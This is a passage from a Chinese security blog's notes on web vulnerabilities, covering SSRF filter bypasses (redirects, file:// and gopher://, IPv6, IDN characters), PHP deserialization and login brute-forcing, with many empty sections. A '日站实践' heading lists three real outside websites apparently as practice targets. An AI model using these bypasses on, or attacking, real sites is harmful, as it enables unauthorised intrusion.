当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.利用跳转</span><br><span class="line">	</span><br><span class="line">	可以使用如 http:&#x2F;&#x2F;httpbin.org&#x2F;redirect-to?url&#x3D;http:&#x2F;&#x2F;192.168.0.1 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5.通过各种非HTTP协议</span><br><span class="line"></span><br><span class="line">	利用file:&#x2F;&#x2F; 、gopher:&#x2F;&#x2F;等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6.DNS Rebinding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7.利用IPv6</span><br><span class="line"></span><br><span class="line">	有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 [::] 0000::1 或IPv6的内网域名来绕过过滤。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.利用IDN</span><br><span class="line"></span><br><span class="line">	一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</span><br><span class="line"></span><br><span class="line">在这些字符中，部分字符会在访问时做一个等价转换，例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。利用这种方式，可以用 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ 等字符绕过内网限制。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="实战案例-7"><a href="#实战案例-7" class="headerlink" title="实战案例"></a>实战案例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="参考资料-8"><a href="#参考资料-8" class="headerlink" title="参考资料"></a>参考资料</h3><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>重点：用户输入可控</p>
<h3 id="漏洞原理-9"><a href="#漏洞原理-9" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">序列化即将对象转化为字节流，便于保存在文件，内存，数据库中；反序列化即将字节流转化为对象</span><br><span class="line"></span><br><span class="line">也就是把数据转化为一种可逆的数据结构，再把这种可逆的数据结构转化回数据，这就是序列化与反序列化</span><br><span class="line"></span><br><span class="line">看到过一个通用的例子（可以应用到很多场景中，比如网络数据包传递接收过程之类的），买一个柜子，从北京运到上海，由于柜子形状怪异，不方便运输，先把它拆成板子，再装到箱子里，顺丰邮到买家手里，把板子拼装回柜子</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">总结一下PHP反序列化漏洞出现的原因：</span><br><span class="line">1.unserialize()传入参数可控</span><br><span class="line">2.没有经过合法性校验</span><br><span class="line">3.存在某些魔法函数，而函数中存在某些危险操作</span><br></pre></td></tr></table></figure>



<h3 id="利用场景-7"><a href="#利用场景-7" class="headerlink" title="利用场景"></a>利用场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">序列化只序列化属性，不序列化方法，因此反序列化的时候要保证在当前的作用域环境下有该类存在，类属性就是唯一的攻击突破口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__toString()触发条件非常多</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/2066571-20200821164655038-1426063419.png" alt="img"></p>
<h3 id="漏洞危害-9"><a href="#漏洞危害-9" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要根据实际情况中，魔法函数调用了哪些危险的函数来决定能够利用到什么程度</span><br></pre></td></tr></table></figure>



<h3 id="测试方法-7"><a href="#测试方法-7" class="headerlink" title="测试方法"></a>测试方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="防御方案-8"><a href="#防御方案-8" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不使用反序列化</span><br><span class="line">如果实在要使用的时候，要保证序列化的内容是可信的</span><br><span class="line">无论输入什么内容，都是不可信的</span><br><span class="line">对输入的内容进行过滤等处理</span><br><span class="line">对传递序列化对象前进行签名、证书、加密，防止篡改和重播</span><br><span class="line">将反序列化函数加载的数据列入白名单</span><br></pre></td></tr></table></figure>



<h3 id="绕过手段-8"><a href="#绕过手段-8" class="headerlink" title="绕过手段"></a>绕过手段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编码</span><br><span class="line">加密</span><br></pre></td></tr></table></figure>



<h3 id="实战案例-8"><a href="#实战案例-8" class="headerlink" title="实战案例"></a>实战案例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自动化工具探测</span><br></pre></td></tr></table></figure>



<h3 id="参考资料-9"><a href="#参考资料-9" class="headerlink" title="参考资料"></a>参考资料</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PHP中的几个特殊的魔术方法。</span><br><span class="line"></span><br><span class="line">    1.__construct()：当对象创建（new）时会自动调用，但在unserialize()时是不会自动调用的（构造函数） </span><br><span class="line"></span><br><span class="line">    2.__destruct()：当对象操作执行完毕后自动执行__destruct()函数的代码。</span><br><span class="line"></span><br><span class="line">    3.__wakeup()：unserialize()时自动调用。</span><br><span class="line">    </span><br><span class="line">    4.__toString()当一个对象被当作一个字符串时使用</span><br><span class="line"></span><br><span class="line">    5.__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/image-20210203205428097.png" alt="image-20210203205428097"></p>
<p>业务逻辑</p>
<p>​    比如说有登陆页面 ，就有输入框，有输入框就会有sql注入漏洞</p>
<p>​    如果账户名和密码是存储前端的 ，那么就可能存在dom 型漏洞</p>
<p>​    如果没有验证码校验  可以直接burp 爆破</p>
<p>​    如果有手机验证码校验 可以通过打码平台</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="漏洞原理-10"><a href="#漏洞原理-10" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="漏洞危害-10"><a href="#漏洞危害-10" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><h3 id="利用场景-8"><a href="#利用场景-8" class="headerlink" title="利用场景"></a>利用场景</h3><h3 id="测试方法-8"><a href="#测试方法-8" class="headerlink" title="测试方法"></a>测试方法</h3><h3 id="防御方案-9"><a href="#防御方案-9" class="headerlink" title="防御方案"></a>防御方案</h3><h3 id="绕过手段-9"><a href="#绕过手段-9" class="headerlink" title="绕过手段"></a>绕过手段</h3><h3 id="实战案例-9"><a href="#实战案例-9" class="headerlink" title="实战案例"></a>实战案例</h3><h3 id="参考资料-10"><a href="#参考资料-10" class="headerlink" title="参考资料"></a>参考资料</h3><h1 id="日站实践"><a href="#日站实践" class="headerlink" title="日站实践"></a>日站实践</h1><p><a target="_blank" rel="noopener" href="http://www.cacpa.in/page.php?id=1">http://www.cacpa.in/page.php?id=1</a></p>
<p><a target="_blank" rel="noopener" href="http://www.htps.edu.hk/tc/">http://www.htps.edu.hk/tc/</a></p>
<p><a target="_blank" rel="noopener" href="http://mrc.cap.utah.edu/">http://mrc.cap.utah.edu/</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Knight-zh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/04/23/%E6%BC%8F%E6%B4%9E%E7%AF%87/">http://example.com/2021/04/23/漏洞篇/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">K夜2H'Spcace</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></div><div class="post_share"><div class="social-share" data-image="https://images.pexels.com/photos/1529881/pexels-photo-1529881.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/23/docker%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"><img class="prev-cover" src="https://images.pexels.com/photos/4245826/pexels-photo-4245826.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">docker的使用教程</div></div></a></div><div class="next-post pull-right"><a href="/2021/04/23/HW%E6%80%BB%E7%BB%93/"><img class="next-cover" src="https://images.pexels.com/photos/1274260/pexels-photo-1274260.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HW总结</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://pic3.zhimg.com/80/v2-4b5c6f721ad9102075ed7808ca857bf8_1440w.jpg?source=1940ef5c" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Knight-zh</div><div class="author-info__description">成长靠的是一点一点积累，进步不需要多大 但是每天都要有</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Knight-zc"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Knight-zc" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:15773221138@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://www.zhihu.com/people/hua-cheng-shao-nian" target="_blank" title="zhihu"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="https://weibo.com/u/5379020309/home?wvr=5" target="_blank" title="weibo"><i class="fab fa-weibo"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">漏洞篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">攻击场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.2.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.4.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.2.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5"><span class="toc-number">1.2.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B"><span class="toc-number">1.2.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.2.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">攻击场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.3.4.</span> <span class="toc-text">测试方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">常规方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">数据库知识补充</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E5%BA%94%E7%94%A8"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">sqlmap应用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-1"><span class="toc-number">1.3.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-1"><span class="toc-number">1.3.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-1"><span class="toc-number">1.3.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-1"><span class="toc-number">1.3.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.4.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-2"><span class="toc-number">1.4.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.4.</span> <span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-2"><span class="toc-number">1.4.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-2"><span class="toc-number">1.4.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-2"><span class="toc-number">1.4.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-2"><span class="toc-number">1.4.8.</span> <span class="toc-text">参考资料</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BBpayload"><span class="toc-number">1.4.8.1.</span> <span class="toc-text">攻击payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.5.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-1"><span class="toc-number">1.5.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-3"><span class="toc-number">1.5.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.5.4.</span> <span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-3"><span class="toc-number">1.5.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-3"><span class="toc-number">1.5.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF"><span class="toc-number">1.5.7.</span> <span class="toc-text">实战场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86"><span class="toc-number">1.5.8.</span> <span class="toc-text">扩展知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session"><span class="toc-number">1.5.8.3.</span> <span class="toc-text">session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie-%E5%92%8C-session-%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB"><span class="toc-number">1.5.8.4.</span> <span class="toc-text">cookie 和 session 的区别与联系</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-3"><span class="toc-number">1.5.9.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-number">1.7.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-2"><span class="toc-number">1.7.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-4"><span class="toc-number">1.7.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.7.4.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-4"><span class="toc-number">1.7.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-4"><span class="toc-number">1.7.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-3"><span class="toc-number">1.7.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-4"><span class="toc-number">1.7.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.</span> <span class="toc-text">文件解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5"><span class="toc-number">1.8.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-3"><span class="toc-number">1.8.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-5"><span class="toc-number">1.8.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-3"><span class="toc-number">1.8.4.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-5"><span class="toc-number">1.8.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-5"><span class="toc-number">1.8.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-4"><span class="toc-number">1.8.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-5"><span class="toc-number">1.8.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.9.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6"><span class="toc-number">1.9.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-4"><span class="toc-number">1.9.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-6"><span class="toc-number">1.9.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-4"><span class="toc-number">1.9.4.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-6"><span class="toc-number">1.9.5.</span> <span class="toc-text">防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%A1%88"><span class="toc-number">1.9.6.</span> <span class="toc-text">绕过方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-5"><span class="toc-number">1.9.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-6"><span class="toc-number">1.9.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.10.</span> <span class="toc-text">命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-7"><span class="toc-number">1.10.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-5"><span class="toc-number">1.10.2.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-7"><span class="toc-number">1.10.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-5"><span class="toc-number">1.10.4.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.10.5.</span> <span class="toc-text">防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-6"><span class="toc-number">1.10.6.</span> <span class="toc-text">绕过手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-6"><span class="toc-number">1.10.7.</span> <span class="toc-text">实战案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-7"><span class="toc-number">1.10.8.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.11.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 